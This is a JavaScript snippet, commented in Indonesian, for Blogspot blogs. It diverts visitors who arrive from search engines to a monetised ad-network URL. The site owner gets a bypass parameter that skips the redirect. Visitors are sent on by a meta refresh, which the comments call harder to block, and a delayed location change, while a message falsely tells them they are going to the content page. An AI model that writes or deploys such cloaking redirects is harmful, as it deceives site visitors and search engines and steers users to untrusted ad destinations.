// Script untuk Blogspot - Redirect Search Engine Traffic
(function() {
    // URL tujuan redirect
    const TARGET_URL = 'https://www.effectivegatecpm.com/ncm6bswk9?key=62528b16899f546dcfe3d7c652d13893';
    
    // Parameter khusus untuk bypass (opsional)
    const BYPASS_PARAM = 'direct';
    
    // Tunggu halaman selesai dimuat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initRedirect);
    } else {
        setTimeout(initRedirect, 500);
    }
    
    function initRedirect() {
        // Cek parameter bypass di URL
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has(BYPASS_PARAM)) {
            console.log('Bypass parameter detected, skip redirect');
            return;
        }
        
        // Cek apakah dari search engine
        if (isSearchEngineTraffic()) {
            console.log('Search engine traffic detected, redirecting...');
            executeRedirect();
        }
    }
    
    function isSearchEngineTraffic() {
        const referrer = document.referrer || '';
        const ua = navigator.userAgent || '';
        
        // Daftar search engine patterns
        const SE_PATTERNS = [
            /google\./i,
            /bing\./i,
            /yahoo\./i,
            /search\./i,
            /yandex\./i,
            /baidu\./i,
            /duckduckgo\./i,
            /q=.*/i, // URL mengandung parameter query
            /search\?/i,
            /\.search\./i
        ];
        
        // Cek referrer
        if (referrer) {
            for (const pattern of SE_PATTERNS) {
                if (pattern.test(referrer)) {
                    return true;
                }
            }
        }
        
        // Cek URL saat ini (untuk kasus Google meng-cache halaman)
        const currentUrl = window.location.href;
        if (/google\.com\/url\?/i.test(currentUrl)) {
            return true;
        }
        
        // Cek jika ada parameter 'q' atau 'query' di URL
        if (/\?.*q=/i.test(currentUrl) || /\?.*query=/i.test(currentUrl)) {
            return true;
        }
        
        return false;
    }
    
    function executeRedirect() {
        // Simpan di sessionStorage untuk mencegah loop
        if (sessionStorage.getItem('redirected')) {
            return;
        }
        sessionStorage.setItem('redirected', 'true');
        
        // Method 1: Meta refresh (lebih sulit diblokir)
        const meta = document.createElement('meta');
        meta.httpEquiv = 'refresh';
        meta.content = '3;url=' + TARGET_URL;
        document.head.appendChild(meta);
        
        // Method 2: Window location dengan delay
        setTimeout(function() {
            window.location.href = TARGET_URL;
        }, 3000);
        
        // Tampilkan pesan untuk user
        showRedirectMessage();
    }
    
    function showRedirectMessage() {
        const message = document.createElement('div');
        message.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border: 2px solid #333;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            z-index: 999999;
            text-align: center;
            max-width: 80%;
        `;
        message.innerHTML = `
            <h3>Redirecting...</h3>
            <p>You are being redirected to the content page.</p>
            <p>If redirect doesn't happen automatically, <a href="${TARGET_URL}">click here</a>.</p>
            <p><small>You came from a search engine: ${document.referrer || 'unknown'}</small></p>
        `;
        document.body.appendChild(message);
    }
})();
